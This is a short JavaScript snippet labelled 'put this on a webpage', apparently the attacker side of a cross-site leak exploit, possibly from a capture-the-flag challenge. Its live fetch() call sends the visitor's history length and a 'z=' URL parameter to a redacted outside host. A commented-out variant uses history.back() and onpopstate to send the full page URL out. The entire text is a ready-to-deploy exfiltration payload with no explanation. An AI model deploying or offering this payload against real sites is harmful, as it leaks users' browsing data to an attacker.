// put this on a webpage 

/*window.onpopstate = () => { console.log('back'); fetch('https://CENSORED/?url='+encodeURIComponent(location.href)); }
history.back();*/

fetch(`https://CENSORED/?char=${history.length-1}&index=${location.href.split('z=')[1]}`)
